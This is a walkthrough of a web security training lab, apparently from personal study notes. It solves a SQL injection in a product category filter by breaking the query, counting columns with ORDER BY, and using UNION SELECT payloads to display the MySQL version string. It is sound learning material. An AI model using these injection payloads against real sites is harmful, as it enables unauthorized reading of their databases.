# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We Try To Inject Single Quote `'` To Break The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Gifts' 
```

When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!

```
SELECT name,description FROM products WHERE category = 'Gifts''
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

MySQL Comment Types !!

| Syntax  | Meaning                 |
| ------- | ----------------------- |
| `--`    | comment (space zaroori) |
| `#`     | comment                 |
| `/* */` | block comment           |

We Try To Inject `'#` To Check The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Gifts' 
```

When We Inject `'#` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!

```
SELECT name,description FROM products WHERE category = 'Gifts'#'
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Finding Number of Columns**

**Method – ORDER BY**

```
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

If `ORDER BY 3` fails, query has 2 columns.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

That `ORDER BY 3` fails, query has 2 columns.

it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!

```
SELECT name,description FROM products WHERE category = 'Gifts'
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's We Use In Our Two Column Table !!

```
'UNION SELECT 'a','b'#
```

Our Backend Code Look's Like This After Injecting This Query !!

```
SELECT name,description FROM products WHERE category = 'Gifts'
UNION
SELECT 'a','b'
```

Then See If Our First and Second Both Column is String They Return No Error !!

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the following payload to display the database version:

```
'UNION SELECT @@version,NULL#
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

They Return MySQL Version !!

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
